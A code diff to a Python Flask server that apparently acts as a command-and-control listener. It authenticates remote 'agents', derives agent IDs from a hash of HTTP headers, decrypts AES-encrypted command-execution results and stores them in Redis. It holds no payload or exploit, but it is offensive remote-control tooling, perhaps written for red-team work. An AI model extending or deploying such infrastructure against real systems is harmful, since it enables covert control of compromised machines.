@@ -1,8 +1,7 @@
 import base64
 import datetime
 import logging
-import sys
-import hexdump
+import hashlib
 from flask import Flask, request, cli, make_response
 from colorama import Fore as Color
 from random import randbytes
@@ -49,6 +48,12 @@ def parse_headers(headers, uri):
             extract_info.update({header[0]: header[1]})
 
     return extract_info
+
+
+def gen_agent_id(http_info):
+    # Values that are consistent within each request
+    #
+    return hashlib.shake_128(http_info["Host"].encode() + http_info["User-Agent"].encode()).hexdigest(12)
 
 
 def initial_authentication(http_info, cookie_values) -> list:
@@ -116,18 +121,12 @@ def decrypt_results(blob):
     decrypted = g.aes_decrypt_cfb(payload, g.session_key)
 
     if decrypted.startswith(b"EXECED"):
-        decrypted = b"Process Executed Successfully."
+        decrypted = b"StartProcess: Job completed with no results"
 
-    return decrypted
+    elif decrypted == b'\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10':
+        decrypted = b"ExecuteCmd: Job completed with no results"
 
-
-def store_job_results(agent_name, results):
-    db = RedisDB()
-    active_jobs = {}
-    completed_jobs = {}
-
-    # Active Jobs
-    job = db.find_job(agent_name, results, cmd=None)
+    return decrypted.decode()
 
 
 def establish_session(http_headers, http_uri) -> list:
@@ -145,7 +144,7 @@ def establish_session(http_headers, http_uri) -> list:
     cookie_values = http_info.pop('Cookie').split('; ')
 
     # Extract the id from the cookie
-    agent_name = cookie_values[0].split('=')[1]
+    agent_name = gen_agent_id(http_info)
 
     for value in cookie_values:
 
@@ -203,7 +202,7 @@ def http_server(u_path):
         http_info = parse_headers(headers=headers, uri=u_path)
         cookie_values = http_info.pop('Cookie').split('; ')
         # Extract the id from the cookie
-        agent_name = cookie_values[0].split('=')[1]
+        agent_name = gen_agent_id(http_info)
 
         # Identify Agent to correlate pending job
         received = request.form
@@ -219,8 +218,9 @@ def http_server(u_path):
 
         # Display results
         if decrypted:
-            print(Color.GREEN, decrypted.decode(), Color.RESET)
-            store_job_results(agent_name, decrypted.decode())
+            db = RedisDB()
+            print(Color.GREEN, "\n" + decrypted, Color.RESET)
+            db.store_job_results(agent_name, decrypted)
 
     return b'200'
 
